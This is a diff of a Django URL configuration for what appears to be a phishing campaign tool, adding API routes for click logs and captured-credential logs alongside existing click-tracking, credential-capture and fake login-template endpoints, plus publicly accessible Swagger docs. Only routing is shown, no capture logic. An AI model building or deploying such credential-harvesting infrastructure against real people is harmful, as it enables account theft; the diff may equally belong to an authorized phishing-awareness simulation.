@@ -1,17 +1,42 @@
-from django.urls import path, include
+from django.urls import path, include, re_path
 from rest_framework.routers import DefaultRouter
-from .views import SenderViewSet, RecipientGroupViewSet, RecipientViewSet, MessageViewSet
+from .views import SenderViewSet, RecipientGroupViewSet, RecipientViewSet, MessageViewSet, ClickLogViewSet, CredentialLogViewSet
 from .views import track_click, capture_credentials, login_template_view
+from rest_framework import permissions
+from drf_yasg.views import get_schema_view
+from drf_yasg import openapi
+
+schema_view = get_schema_view(
+    openapi.Info(
+        title="Django API",
+        default_version='v1',
+        description="Документация API проекта",
+        terms_of_service="https://www.example.com/terms/",
+        contact=openapi.Contact(email="ten.olga.011@gmail.com"),
+        license=openapi.License(name="MIT License"),
+    ),
+    public=True,
+    permission_classes=(permissions.AllowAny,),
+)
+
 
 router = DefaultRouter()
 router.register(r'senders', SenderViewSet)
 router.register(r'recipient_groups', RecipientGroupViewSet)
 router.register(r'recipients', RecipientViewSet)
 router.register(r'messages', MessageViewSet)
+router.register(r'click_logs', ClickLogViewSet)
+router.register(r'credential_logs', CredentialLogViewSet)
+
 
 urlpatterns = [
-    path('api/', include(router.urls)),  # Для API-эндпоинтов
+    path('api/', include(router.urls)), 
     path("track/<int:recipient_id>/", track_click, name="track_click"),
     path("capture/<int:recipient_id>/", capture_credentials, name="capture_credentials"),
     path("email-template/<int:recipient_id>/", login_template_view, name="email_template"),
+    path('swagger/', schema_view.with_ui('swagger', cache_timeout=0), name='schema-swagger-ui'),
+    path('redoc/', schema_view.with_ui('redoc', cache_timeout=0), name='schema-redoc'),
+    re_path(r'^swagger(?P<format>\.json|\.yaml)$', schema_view.without_ui(cache_timeout=0), name='schema-json'),
 ]
+
+
